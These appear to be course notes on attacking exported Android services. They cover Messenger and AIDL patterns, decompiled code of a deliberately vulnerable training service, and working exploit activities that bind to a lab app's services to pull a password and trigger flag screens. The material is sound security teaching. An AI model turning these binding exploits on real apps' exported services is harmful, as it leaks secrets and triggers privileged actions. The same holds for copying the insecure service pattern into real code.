# Android Services
- [Overview](#overview)
- [Bindable service & Non-bindable service](#bindable-service--non-bindable-service)
- [Message Handler Service](#message-handler-service)
- [AIDL Service](#aidl-service)



## Overview
- Exposed Services offer another interesting threat surface for applications and in this course we will learn what it is about.

    - Activity: Runs in the foreground and renders the UI
    - Broadcast Receiver: Runs in the background to execute a minimal task
    - Service: Executes long running tasks in the background

- Services can be used for various tasks such as downloads or uploads. But they are also involved in things like media playback.

- Services can be easily identified in the AndroidManifest.xml:

```xml
<service android:name="io.example.services.MyService"
 android:enabled="true" android:exported="true">
    <intent-filter>
        <action android:name="io.example.START"/>
    </intent-filter>
</service>
```

- Job Service
    - A very common service you might see exposed is an Android Job Scheduler service. However due to the android.permission.BIND_JOB_SERVICE permission this service cannot be directly interacted with and can usually be ignored when hunting for bugs.

```xml
<service android:name=".MyJobService" 
 android:permission="android.permission.BIND_JOB_SERVICE"
 android:exported="true">
</service>
```

## Bindable service & Non-bindable service
- Bindable service
    - You connect to it with `bindService()`.
    - When bound, you get a communication channel (like a hotline).
    - You can call its methods, send data, and get results back.
    - It runs only as long as something is bound. When everyone disconnects, it dies.
    - Example: an app that provides real-time data (like a step counter service) — the activity binds to it to constantly get updates.

- Non-bindable service
    - You start it with `startService()` or `startForegroundService()`.
    - It just runs in the background doing its job.
    - Example: a music player keeps playing even if you leave the app.
    - You can't directly talk to it (no way to ask it for info or send commands, unless you use other tricks like broadcasts).
    - It usually stops itself when the task is done or you call `stopService()`.

- Summary
    - Non-bindable → fire-and-forget, runs in background, no direct talking.
    - Bindable → you bind to it, can communicate directly, runs only while bound.


## Message Handler Service
- The "message handler" pattern is a typical kind of service implemented with the Messenger class.

- A messenger service can easily be recognised by looking at the onBind() method that returns a IBinder object created from the Messenger class.
```java
public class MyMessageService extends Service {
    public static final int MSG_SUCCESS = 42;
    final Messenger messenger = new Messenger(new IncomingHandler(Looper.getMainLooper()));

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return this.messenger.getBinder();
    }

    class IncomingHandler extends Handler {

        IncomingHandler(Looper looper) {
            super(looper);
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            if (message.what == 42) {
                // ...
            } else {
                super.handleMessage(message);
            }
        }
    }
}
```
- Binding a service:
```java
public class MainActivity extends AppCompatActivity {
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Messenger serviceMessenger = new Messenger(service);
            // Method to send messages to the service
            Message msg = Message.obtain(null, 42);
            try{
                serviceMessenger.send(msg);
            }
            catch (RemoteException e){
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.click);
        button.setOnClickListener(v -> {
            // Bind to the service
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
            bindService(intent, connection, Context.BIND_AUTO_CREATE);
        });

    }

}
```
- Also we can send parcelable object or create a bundel with setData to the message via `msg.obj = ` , `msg.setData(new Bundle());` respectively
- Service can respond with `msg.replyTo =`

- Example:
```java
// Vulnerable service
public class Flag27Service extends Service {
    public static final int MSG_ECHO = 1;
    public static final int MSG_GET_FLAG = 3;
    public static final int MSG_GET_PASSWORD = 2;
    public static String secret = UUID.randomUUID().toString();
    final Messenger messenger = new Messenger(new IncomingHandler(Looper.getMainLooper()));

    class IncomingHandler extends Handler {
        String echo;
        String password;

        IncomingHandler(Looper looper) {
            super(looper);
            this.echo = "";
            this.password = null;
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) throws RemoteException {
            Log.i("Flag27Service", "handleMessage(" + message.what + ")");
            int i = message.what;
            if (i == 1) {
                this.echo = message.getData().getString("echo");
                Toast.makeText(Flag27Service.this.getApplicationContext(), this.echo, 0).show();
                return;
            }
            if (i != 2) {
                if (i == 3) {
                    String string = message.getData().getString("password");
                    if (!this.echo.equals("give flag") || !this.password.equals(string)) {
                        Flag27Service.this.sendReply(message, "no flag");
                        return;
                    } else {
                        Flag27Service.this.sendReply(message, "success! Launching flag activity");
                        Flag27Service.this.success(this.echo);
                        return;
                    }
                }
                super.handleMessage(message);
                return;
            }
            if (message.obj == null) {
                Flag27Service.this.sendReply(message, "Error");
                return;
            }
            Message messageObtain = Message.obtain((Handler) null, message.what);
            Bundle bundle = new Bundle();
            String string2 = UUID.randomUUID().toString();
            this.password = string2;
            bundle.putString("password", string2);
            messageObtain.setData(bundle);
            try {
                message.replyTo.send(messageObtain);
                Flag27Service.this.sendReply(message, "Password");
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        Log.i("Flag27Service", Utils.dumpIntent(this, intent));
        return this.messenger.getBinder();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void sendReply(Message message, String str) throws RemoteException {
        try {
            Message messageObtain = Message.obtain((Handler) null, message.what);
            messageObtain.getData().putString("reply", str);
            message.replyTo.send(messageObtain);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void success(String str) {
        Intent intent = new Intent(this, (Class<?>) Flag27Activity.class);
        intent.putExtra("secret", secret);
        intent.putExtra("echo", str);
        intent.addFlags(268468224);
        intent.putExtra("hideIntent", true);
        startActivity(intent);
    }
}
// -------------------------------------------------------------------------------------------------
// Exploit
public class Hextree extends AppCompatActivity {
    private boolean isBound = false;
    private final Messenger clientMessegener = new Messenger(new IncomingHandler());
    private Messenger serviceMessenger = null;
    private String obtainedPassword;
    private class IncomingHandler extends Handler{
        IncomingHandler() {super(Looper.getMainLooper());}

        @Override
        public void handleMessage(Message msg){
            Bundle reply =  msg.getData();
            obtainedPassword = reply.getString("password");
            if(reply != null && obtainedPassword != null) {
                Log.i("MessageReply1234", reply.toString());
                Log.d("MessageReply1234", "Obtained password: " + obtainedPassword);

            getFlag(obtainedPassword);
            }
            else{
                Log.i("Message1234", "NO Reply");
            }

        }
    }
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            serviceMessenger = new Messenger(binder);
            isBound = true;
            // Start by getting the secret
            requestPassword();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };
    // Method to request the password
    private void requestPassword() {
        if (!isBound) return;
        Message msg = Message.obtain(null, 2);
        msg.obj = new Bundle();
        msg.replyTo = clientMessegener;
        try {
            serviceMessenger.send(msg);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }
    private void getFlag(String Password) {
    // First, send "give flag" echo
        Message msg = Message.obtain(null, 1);
        Bundle bundle = new Bundle();
        bundle.putString("echo", "give flag");
        msg.setData(bundle);
        msg.replyTo = clientMessegener;
        try {
            serviceMessenger.send(msg);
        } catch (RemoteException e) {
            e.printStackTrace();
        }

    // Now, send the retrevied password with int = 3 to get flag
        msg = Message.obtain(null, 3);
        bundle = new Bundle();
        bundle.putString("password", Password);
        msg.setData(bundle);
        msg.replyTo = clientMessegener;
        try {
            serviceMessenger.send(msg);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.click);
        button.setOnClickListener(v -> {
            // Bind to the service
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
            bindService(intent, connection, Context.BIND_AUTO_CREATE);
        });

    }

}
```

## AIDL Service
- Services based on AIDL (Android Interface Definition Language) can be easily recognised by looking at the `onBind()` method that returns some kind of .Stub binder.

- These services are based on AIDL files, which look similar to Java, but they are written in the "Android Interface Definition Language".

```
package io.hextree.attacksurface.services;

interface IFlag28Interface {
    boolean openFlag();
}
```

- During compilation this .aidl definition is then translated into an actual .java class that implements the low-level binder code to interact with the service.

- When we want to interact with such a service we probably want to reverse engineer the original .aidl file.

```java
// Exploit
public class Hextree extends AppCompatActivity {
    private Messenger serviceMessenger = null;
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            serviceMessenger = new Messenger(binder);
            IFlag28Interface aidlService = IFlag28Interface.Stub.asInterface(binder);
            try {
                aidlService.openFlag();
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.click);
        button.setOnClickListener(v -> {
            // Bind to the service
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
            bindService(intent, connection, Context.BIND_AUTO_CREATE);
        });

    }

}
```
 
